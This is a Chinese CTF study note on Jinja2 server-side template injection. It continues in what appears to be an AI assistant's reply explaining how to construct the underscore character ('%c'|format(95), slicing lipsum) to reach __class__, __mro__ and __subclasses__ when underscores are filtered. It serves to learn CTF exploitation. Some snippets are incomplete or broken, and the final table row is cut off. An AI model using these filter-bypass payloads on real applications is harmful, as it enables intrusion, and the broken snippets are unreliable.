本题过滤了 `_` ，但是经过测试发现，它只过滤模板内部的 `_` 。
所以我们直接用 `request.values.a` 直接传参就行了。
不过该解法还是有一些很重要的知识点: 
- jinja2的 #attr过滤器
- jinja2的 `|` #过滤器操作符
具体wp可以参见[[SSTI-Jinja2-Filter-Bypass-WP]]
### 下面我们来看看 #整个url参数过滤了_ 该怎么办

---

好问题！如果连 URL 参数里的 `_` 也被过滤，就需要**在模板内部动态构造 `_` 字符**。

## 思路：从已有对象中"挖"出 `_`

Jinja2 内置了一些对象，它们的字符串表示里含有 `_`，可以 #切片提取。

### 方法1：`lipsum` 过滤器

```jinja2
{{lipsum|string}}
```

输出类似：`<function generate_lorem_ipsum at 0x...>`

其中 `_` 在固定位置，可以切片：

```jinja2
{{lipsum|string|list}}          {# 转成字符列表 #}
{{lipsum|string|list|attr(某index)}}  
```

### 方法2：从 `dict` 构造

```jinja2
{# dict(a=1)|string => "{'a': 1}" 没有下划线 #}
{# 但 namespace 对象有 #}
{{namespace|string}}   {# <class 'jinja2.utils.Namespace'> 含有 _ #}
```

### 方法3：`|format` + 字符拼接（常用）

先用 `%c` 格式化构造 `_`（ASCII 95）：

```jinja2
{# 95 是 _ 的 ASCII 码 #}
{%set x=dict(a=1)|string|count%}   {# 随便凑数字 #}
```

更直接的方式：

```jinja2
{%set underscore = lipsum|string|list|attr('\x5f\x5f...'%}
```

---

## 最实用的通用方法：`%c` 格式化

Jinja2 支持 `%` 格式化字符串：

```jinja2
{# 构造数字 95 = '_' 的 ASCII #}
{%set i=(()|string|list|count)%}  {# 凑数字 #}

{# 或者直接用数字字面量 #}
{%set udl = "%c"|format(95)%}      {# udl = '_' #}
{%set payload = udl*2~"class"~udl*2%}  {# = '__class__' #}
{{()|attr(payload)}}
```

---

## 完整示例

```jinja2
{%set udl="%c"|format(95)%}
{%set a=udl*2~"class"~udl*2%}
{%set b=udl*2~"mro"~udl*2%}
{%set c=udl*2~"subclasses"~udl*2%}
{{()|attr(a)|attr(b)}}
```

`~` 是 Jinja2 的**字符串拼接符**，`udl*2` 就是 `__`。

---

## 过滤情况对应策略总结

|过滤内容|绕过方式|
|---|---|
|模板中的 `_`|`request.values` 传参|
|模板+URL参数中的 `_`|`"%c"\|format(95)` 构造|
|还过滤了 `%`、`format`|从 `lipsum` 等内置对象切片取字符|
|过滤了数字|用 `()|

你当前的题目具体过滤了哪些？可以继续针对性地绕。